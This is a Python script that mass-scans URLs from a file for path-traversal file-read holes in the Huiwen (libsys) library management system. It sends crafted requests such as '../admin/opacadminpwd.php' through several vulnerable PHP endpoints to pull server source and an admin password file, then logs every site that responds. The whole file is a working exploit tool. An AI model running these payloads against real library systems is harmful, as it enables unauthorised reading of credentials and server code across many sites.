
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    try:
        noexist = True
        for payload in [r"/zplug/ajax_asyn_link.php?url=../opac/search.php",
                        r"/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
                        r"/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]:
            vulnurl = url + payload

            req = requests.get(vulnurl, timeout=10, verify=False)
            if r"<?php" in req.text:
                print("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('文件读取漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
                noexist = False
        if noexist:
            print("[-]不存在libsys_ajax_asyn_link_fileread漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"<?php" in req.text:
            print("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('文件读取漏洞2.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在libsys_ajax_asyn_link_old_fileread漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/opac/ajax_get_file.php?filename=../admin/opacadminpwd.php"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"<?php" in req.text:
            print("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('文件读取漏洞3.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在libsys_ajax_get_file_fileread漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")